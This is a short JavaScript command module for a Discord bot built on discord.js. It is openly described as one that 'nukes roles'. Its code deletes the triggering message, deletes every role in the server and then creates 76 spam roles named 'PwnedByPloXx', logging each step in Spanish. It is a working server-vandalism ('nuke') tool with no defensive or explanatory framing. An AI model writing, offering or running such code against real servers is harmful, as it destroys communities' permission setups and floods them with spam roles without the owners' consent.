const chalk = require("chalk");
const Discord = require("discord.js");
const { Client, MessageEmbed } = require("discord.js")

module.exports = {
    name: 'roles',
    description: 'nukes roles',
    execute(message, args) {
        message.delete()
        console.log((chalk.red(`(+)Roles eliminados en ${message.guild.name}`)));
        message.guild.roles.cache.forEach(Role => Role.delete());
        console.log((chalk.red(`(+)Roles creados en ${message.guild.name}`)));
        for (let i = 0; i <= 75; i++) {
            message.guild.roles.create({
                data: {
                    name: 'PwnedByPloXx',
                    color: "RANDOM",
                },
            })
        }      
    }
}